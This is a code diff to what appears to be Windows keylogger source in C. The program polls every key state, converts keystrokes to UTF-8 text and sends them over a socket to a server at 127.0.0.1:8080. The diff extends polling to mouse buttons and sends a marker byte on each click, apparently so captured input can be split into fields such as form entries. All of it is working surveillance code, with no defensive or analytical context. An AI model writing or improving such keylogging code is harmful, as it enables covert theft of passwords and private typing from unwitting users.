@@ -8,6 +8,7 @@
     #define WSA_VERSION_CODE 0x202
     #define SERVER_ADDR "127.0.0.1"
     #define SERVER_PORT 8080
+    #define CLICK_MARKER '\x01'
 
     //TRANSLATE A KEYSTROKE INTO THE UTF-8 TEXT THE USER IS ACTUALLY TYPING
     static int keyToUtf8(int vk, char *out, int outSize){
@@ -53,6 +54,13 @@
         char text[8];
         int length = 0;
         unsigned char firstByte;
+
+        //MOUSE CLICKS TELL THE SERVER TO BREAK THE LINE (LIKE CHANGING FIELDS)
+        if(vk == VK_LBUTTON || vk == VK_RBUTTON || vk == VK_MBUTTON ||
+           vk == VK_XBUTTON1 || vk == VK_XBUTTON2){
+            text[0] = CLICK_MARKER;
+            return send(connectionSocket, text, 1, 0) != SOCKET_ERROR;
+        }
 
         switch(vk){
             case VK_RETURN: text[0] = '\n'; length = 1; break;
@@ -122,7 +130,7 @@
 
         while(keepRunning){
             Sleep(10);
-            for(vk = 0x08; vk <= 0xFE; vk++){
+            for(vk = 0x01; vk <= 0xFE; vk++){    //0x01..0x06 ARE THE MOUSE BUTTONS
                 if(GetAsyncKeyState(vk) & 0x8000){
                     if(!keyWasDown[vk]){
                         keyWasDown[vk] = TRUE;
